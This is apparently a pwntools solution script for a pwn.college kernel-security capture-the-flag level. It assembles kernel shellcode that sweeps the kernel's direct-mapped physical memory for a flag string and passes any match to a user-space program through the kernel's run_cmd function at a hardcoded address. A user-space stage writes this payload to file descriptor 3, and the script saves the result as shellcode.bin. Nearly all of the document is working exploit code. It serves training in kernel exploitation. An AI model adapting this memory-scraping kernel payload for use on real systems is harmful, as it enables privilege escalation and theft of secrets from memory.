import sys
sys.path.append("..")

from pwn import context, shellcraft
from common import *
context(arch = 'amd64', os = 'linux')

kernel_assembly = f"""
.equ    page_offset_base_min, 0xffff888000000000
.equ    page_offset_base_max, 0xffff888000000000 + 2029520 * 1024

movabs  rbx, page_offset_base_min

loop_start:
mov     rdx, page_offset_base_max
cmp     rbx, rdx
ja      loop_end
lea     rdi, [rip + flag_startwith_string]
lea     rsi, [rbx + 0x40]
call    str_startwith
test    rax, rax
jz      loop_next
lea     rdi, [rbx + 0x40]
call    send_message
loop_next:
add     rbx, 0x1000
jmp     loop_start
loop_end:
ret
int     3

str_startwith:
    /* const char * comparee in `rdi`, end with 0x00; const char * comparer in `rsi`  */
    /* Clobber: rax, rdi, rsi, rcx */
    push    rdi
    {shellcraft.amd64.strlen('rdi', 'rcx')}
    pop     rdi
    cld
    repe cmpsb
    jz      str_startwith_stop
    xor     rax, rax
    ret
str_startwith_stop:
    mov     rax, 1
    ret
    int     3

send_message:
    /* const char * message in `rdi` */
    /* Clobber: all volatile registers */
    lea     rsi, [rip + run_cmd_buffer]
    {shellcraft.amd64.strcpy('rsi', 'rdi')}
    lea     rdi, [rip + run_cmd_arg]
    movabs  rsi, 0xffffffff81089b30             /* run_cmd */
    call    rsi
    ret
    int     3

flag_startwith_string:
    .ascii  "pwn.college"
    .byte   0x7B, 0x00
run_cmd_arg:
    .ascii  "/home/hacker/KernelSecurity/Level12.0/write "
run_cmd_buffer:
    .byte   0x00
""".strip()

kernel_machine_code = dump_machine_code(kernel_assembly)

user_assembly = f"""
{shellcraft.amd64.pushstr(kernel_machine_code, append_null=False)}
{shellcraft.amd64.linux.write(3, "rsp", len(kernel_machine_code))}
""".strip()

user_machine_code = dump_machine_code(user_assembly)

with open('shellcode.bin', 'wb') as f:
    f.write(user_machine_code)
    f.write(b'\xcc' * (0x1000 - len(user_machine_code)))